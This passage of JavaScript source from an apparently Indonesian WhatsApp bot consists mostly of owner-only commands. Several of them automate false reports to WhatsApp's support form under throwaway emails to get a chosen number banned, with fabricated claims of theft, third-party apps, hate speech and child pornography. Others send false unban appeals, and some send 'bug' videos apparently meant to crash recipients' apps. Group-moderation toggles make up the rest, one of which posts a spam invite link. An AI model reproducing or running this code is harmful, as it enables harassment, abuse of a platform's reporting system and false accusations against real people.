let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Hello, please deactivate this number, because I have lost my cellphone and someone is using my number, please deactivate my number")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Biiofc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "bannedv2": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62895354709030`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Porfavor, desative o número da minha conta, o chip e os documentos foram roubados essa conta possuí dados importante, então, por favor desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Biiofc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "bannedv3": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62895354709030`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/Roubado: Por favor, desative minha conta\n\nOlá, por favor desative este número, pois perdi meu celular e alguém está usando meu número, por favor desative meu número")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Biiofc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "bannedv4": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62895354709030`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "UM DE SEUS USUÁRIOS, ESTA USANDO O APK DO WHATSAPP FEITO POR TERCEIROS E ESTA INDO CONTRA OS TERMOS DE SERVIÇO PEÇO QUE ANALISEM ESSE USUÁRIO")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Biiofc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "bannedv5": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62895354709030`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "مرحبًا ، يرجى إلغاء تنشيط هذا الرقم ، لأنني فقدت هاتفي وشخص ما يستخدم رقمي ، يرجى إلغاء تنشيط رقمي")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Biiofc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "bannedv6": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62895354709030`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Esse número vem fazendo discurso ao ódio e divulgado conteúdo de porno infantil Numero")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Biiofc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "unbannedv1": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62895354709030`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Hello WhatsApp team, recently my WhatsApp number was suddenly blocked and I couldnt log into my account, in my account there is an important group like a school group and I have to read it but the account My WhatsApp is suddenly blocked, please restore my numbers")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Biiofc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "unbannedv2": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62895354709030`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Equipe, o sistema de vocês baniram meu número por engano. Peço que vocês reativem meu número pois tenho família em outro país e preciso me comunicar com eles")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Biiofc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "unbannedv3": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62895354709030`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Kepada pihak WhatsApp yang bijak Sana kenapa akun WhatsApp saya terblokir padahal aktifitas WhatsApp messenger saya normal normal saja mohon dibukakan kembali akun WhatsApp saya dengan ini saya cantumkan kode nomor akun WhatsApp messenger saya sekian banyak Terimakasih")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Biiofc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "unbannedv4": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62895354709030`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "مرحبًا whatsapp ، تم حظر حسابي بشكل دائم أو مؤقت ، يرجى إلغاء حظر حسابي\nالرقم")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Biiofc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "unbannedv5": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62895354709030`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Halo pak, Akun Whatsapp Saya diblokir Saya Maaf Saya Telah Menginstal Aplikasi Pihak Ketiga Secara Tidak Sengaja. Harap Buka Blokir Akun Saya Sesegera Mungkin. Terimakasih")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Biiofc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "linkgc": case "linkgroup":{
if (!isOwner) return reply(`Khusus RIDZ STORE Aja`)
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
const url = await Biiofc.groupInviteCode(m.chat)
const asu = "https://chat.whatsapp.com/" + url
reply(asu)
}
break
case "hidetag": {
if (!isOwner) return reply(`Khusus RIDZ STORE Aja`)
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
if (!q) return reply(`Teks?`)
global.hit = q
Biiofc.sendMessage(from, { text : global.hit ? global.hit : '' , mentions: participants.map(a => a.id)}, { quoted: m })
}
break
case "add": {
if (!isOwner) return reply(`Khusus RIDZ STORE Aja`)
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botAdmin)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Biiofc.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break
case "kick": {
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Biiofc.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break
case "promote": {
if (!isOwner) return reply(`Khusus RIDZ STORE Aja`)
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Biiofc.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break
case "demote": {
if (!isOwner) return reply(`Khusus RIDZ STORE Aja`)
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Biiofc.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break
case 'RIDZ STORE2': { 
if (!isOwner) return reply(`Khusus RIDZ STORE Aja`)
joauuuuuuu = fs.readFileSync('./freya/bug1.mp4')
Biiofc.sendMessage(m.chat, {video: joauuuuuuu, caption:`selamat datang`,viewOnce : true},{quoted:m })
}
break
case 'RIDZ STORE1':{
if (!isOwner) return reply(`Khusus RIDZ STORE Aja`)
  Biiofc.sendMessage(from, {
    'text': 'HOX WA MU NENTAL'
  }, {
    'quoted': lep
  })
  }
  break
case 'RIDZ STORE3': { 
if (!isOwner) return reply(`Khusus RIDZ STORE Aja`)
joauuuuuuu = fs.readFileSync('./freya/bug2.mp4')
Biiofc.sendMessage(m.chat, {video: joauuuuuuu, caption:`selamat datang`,viewOnce : true},{quoted:m })
}
break
case 'antivirus': case 'antivirtex': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
if (args[0] === "on") {
if (antivirus) return reply('Sukses Mengaktifikan Tuan✅')
antivirus.push(from)
fs.writeFileSync('./database/antivirus.json', JSON.stringify(antivirus))
reply('Success in turning on antivirus in this group')
var groupe = await Biiofc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Biiofc.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNo body is allowed to send virus in this group, member who send will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antivirus) return reply('Sukses Menonaktifkan Tuan✅')
let off = antivirus.indexOf(from)
antivirus.splice(off, 1)
fs.writeFileSync('./database/antivirus.json', JSON.stringify(antivirus))
reply('Success in turning off antivirus this group')
} else {
  await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
case 'antilinkinstagram': case 'antilinkig': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
if (args[0] === "on") {
if (antilinkinstagram) return reply('Sukses Mengaktifikan Tuan✅')
antilinkinstagram.push(from)
fs.writeFileSync('./database/antilinkinstagram.json', JSON.stringify(antilinkinstagram))
reply('Success in turning on instagram antilink in this group')
var groupe = await Biiofc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Biiofc.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the instagram link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antilinkinstagram) return reply('Sukses Menonaktifkan Tuan✅')
let off = antilinkinstagram.indexOf(from)
antilinkinstagram.splice(off, 1)
fs.writeFileSync('./database/antilinkinstagram.json', JSON.stringify(antilinkinstagram))
reply('Success in turning off instagram antilink in this group')
} else {
  await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
case 'antilinkfacebook': case 'antilinkfb': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
if (args[0] === "on") {
if (antilinkfacebook) return reply('Sukses Mengaktifikan Tuan✅')
antilinkfacebook.push(from)
fs.writeFileSync('./database/antilinkfacebook.json', JSON.stringify(antilinkfacebook))
reply('Success in turning on facebook antilink in this group')
var groupe = await Biiofc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Biiofc.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the facebook link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antilinkfacebook) return reply('Sukses Menonaktifkan Tuan✅')
let off = antilinkfacebook.indexOf(from)
antilinkfacebook.splice(off, 1)
fs.writeFileSync('./database/antilinkfacebook.json', JSON.stringify(ntilinkfb))
reply('Success in turning off facebook antilink in this group')
} else {
  await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
case 'antilinktelegram': case 'antilinktg': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
if (args[0] === "on") {
if (antilinktelegram) return reply('Sukses Mengaktifikan Tuan✅')
antilinktelegram.push(from)
fs.writeFileSync('./database/antilinktelegram.json', JSON.stringify(antilinktelegram))
reply('Success in turning on telegram antilink in this group')
var groupe = await Biiofc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Biiofc.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the telegram link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antilinktelegram) return reply('Sukses Menonaktifkan Tuan✅')
let off = antilinktelegram.indexOf(from)
antilinktelegram.splice(off, 1)
fs.writeFileSync('./database/antilinktelegram.json', JSON.stringify(antilinktelegram))
reply('Success in turning off telegram antilink in this group')
} else {
  await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
case 'antilinktiktok': case 'antilinktt': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
if (args[0] === "on") {
if (antilinktiktok) return reply('Sukses Mengaktifikan Tuan✅')
antilinktiktok.push(from)
fs.writeFileSync('./database/antilinktiktok.json', JSON.stringify(antilinktiktok))
reply('Success in turning on tiktok antilink in this group')
var groupe = await Biiofc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Biiofc.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the tiktok link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antilinktiktok) return reply('Sukses Menonaktifkan Tuan✅')
let off = antilinktiktok.indexOf(from)
antilinktiktok.splice(off, 1)
fs.writeFileSync('./database/antilinktiktok.json', JSON.stringify(antilinktiktok))
reply('Success in turning off tiktok antilink in this group')
} else {
  await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
case 'antilinktwitter': case 'antilinktwit': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
if (args[0] === "on") {
if (antilinktwitter) return reply('Sukses Mengaktifikan Tuan✅')
antilinktwitter.push(from)
fs.writeFileSync('./database/antilinktwitter.json', JSON.stringify(antilinktwitter))
reply('Success in turning on twitter antilink in this group')
var groupe = await Biiofc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Biiofc.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the twitter link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antilinktwitter) return reply('Sukses Menonaktifkan Tuan✅')
let off = antilinktwitter.indexOf(from)
antilinktwitter.splice(off, 1)
fs.writeFileSync('./database/antilinktwitter.json', JSON.stringify(antilinktwitter))
reply('Success in turning off twitter antilink in this group')
} else {
  await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
case 'antiwame': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
if (args[0] === "on") {
if (antiwame) return reply('Sukses Mengaktifikan Tuan✅')
antiwame.push(from)
fs.writeFileSync('./database/antiwame.json', JSON.stringify(antiwame))
reply('Success in turning on antiwame in this group')
var groupe = await Biiofc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Biiofc.sendMessage(from, {text: `\`\`\`JOIN GUYS 700 MEMBER MAU BERBAGI VPS AND ADMIN PANEL\`\`\`\n\nhttps://chat.whatsapp.com/ECx4Cm22AA6KPTqnh1XH9j`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antiwame) return reply('Sukses Menonaktifkan Tuan✅')
let off = antiwame.indexOf(from)
antiwame.splice(off, 1)
fs.writeFileSync('./database/antiwame.json', JSON.stringify(antiwame))
reply('Success in turning off antiwame in this group')
} else {
